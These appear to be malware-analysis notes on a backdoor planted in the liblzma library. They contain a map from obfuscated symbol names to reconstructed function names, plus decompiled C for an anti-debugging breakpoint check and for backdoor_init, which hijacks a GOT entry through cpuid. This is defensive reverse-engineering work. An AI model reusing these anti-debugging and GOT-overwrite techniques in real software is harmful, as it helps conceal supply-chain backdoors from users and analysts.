- `Llzma_delta_props_decoder` -> `backdoor_ctx_save`

- `Llzma_block_param_encoder_0` -> `backdoor_init`
- `Llzma_delta_props_encoder` -> `backdoor_init_stage2`

- `Llzma_simple_props_size_part_0` -> `is_gnu_relro`


-----
##### Prefix Trie (https://social.hackerspace.pl/@q3k/112184695043115759)
- `Llzip_decode_1` -> `table1`
- `Lcrc64_clmul_1` -> `table2`	
-----

- `Llzma_delta_decoder_init_part_0` -> `backdoor_ctx_init`
- `Lsimple_coder_update_0` -> `table_get`
- `Lcrc_init_0` -> `table_lookup_multi`
- `Llz_stream_decode` -> `count_1_bits`
- `.Lcrc64_generic.0` -> `table_lookup_ex`

- `Llzma_block_buffer_encode_0` -> `check_F223`
- `Lstream_decoder_memconfig_part_1` -> `get_lzma_allocator`

- `Llzma_simple_props_encode_1` -> `j_tls_get_addr`
- `Llzma_block_uncomp_encode_0` -> `rodata_ptr_offset`

- `Llzma12_coder_1` -> `global_ctx`

- `Llzma_index_memusage_0` -> `apply_entries`
- `Llzma_check_init_part_0` -> `apply_one_entry`
- `Lrc_read_init_part_0` -> `apply_one_entry_internal`

- `Llzip_decoder_memconfig_part_0` -> `installed_func_0`
- `Llzma_index_stream_size_1` -> `installed_func_1`
- `Lindex_decode_1` -> `installed_func_2`
- `Lindex_encode_1` -> `installed_func_3`

- `Llzma2_decoder_end_1` -> `apply_one_entry_ex`

- `Lget_literal_price_part_0` -> `parse_elf`
- `Lparse_bcj_0` -> `process_elf_seg`

- `Lmicrolzma_encoder_init_1` -> `parse_elf_init`
- `Llzma_filter_decoder_is_supported.part.0` -> `parse_elf_invoke`

- `Llzma_stream_header_encode_part_0` -> `get_ehdr_address`
- `Llzma_stream_flags_compare_1` -> `get_rodata_ptr`

- `Llzma2_encoder_init.1` -> `apply_method_1`
- `Llzma_memlimit_get_1` -> `apply_method_2`

- `Lx86_code_part_0` -> `code_dasm`


-----
Software Breakpoint check, method 1
-----

This method checks if the instruction `endbr64`, which is always present at the beginning of every function in the malware, is overwritten.
GDB would typically do this when inserting a software breakpoint

```c
/*** address: 0xAB0 ***/
__int64 check_software_breakpoint(_DWORD *code_addr, __int64 a2, int a3)
{
  unsigned int v4;

  v4 = 0;
  // [for a3=0xe230], true when *v = 0xfa1e0ff3 (aka endbr64)
  if ( a2 - code_addr > 3 )
    return *code_addr + (a3 | 0x5E20000) == 0xF223;// 5E2E230
  return v4;
}
```

----
Function backdoor_init (0xA784

```c
__int64 backdoor_init(rootkit_ctx *ctx, DWORD *prev_got_ptr)
{
  _DWORD *v2;
  __int64 runtime_offset;
  bool is_cpuid_got_zero;
  void *cpuid_got_ptr;
  __int64 got_value;
  _QWORD *cpuid_got_ptr_1;

  ctx->self = ctx;
  // store rootkit data before overwrite
  rootkit_ctx_save(ctx);
  ctx->prev_got_ptr = ctx->got_ptr;
  runtime_offset = ctx->head - ctx->self;
  ctx->runtime_offset = runtime_offset;
  is_cpuid_got_zero = (char *)*(&Llzma_block_buffer_decode_0 + 1) + runtime_offset == 0LL;
  cpuid_got_ptr = (char *)*(&Llzma_block_buffer_decode_0 + 1) + runtime_offset;
  ctx->got_ptr = cpuid_got_ptr;
  if ( !is_cpuid_got_zero )
  {
    cpuid_got_ptr_1 = cpuid_got_ptr;
    got_value = *(QWORD *)cpuid_got_ptr;
    // replace with Llzma_delta_props_encoder (backdoor_init_stage2)
    *(QWORD *)cpuid_got_ptr = (char *)*(&Llzma_block_buffer_decode_0 + 2) + runtime_offset;
    // this calls Llzma_delta_props_encoder due to the GOT overwrite
    runtime_offset = cpuid((unsigned int)ctx, prev_got_ptr, cpuid_got_ptr, &Llzma_block_buffer_decode_0, v2);
    // restore original
    *cpuid_got_ptr_1 = got_value;
  }
  return runtime_offset;
}
```
----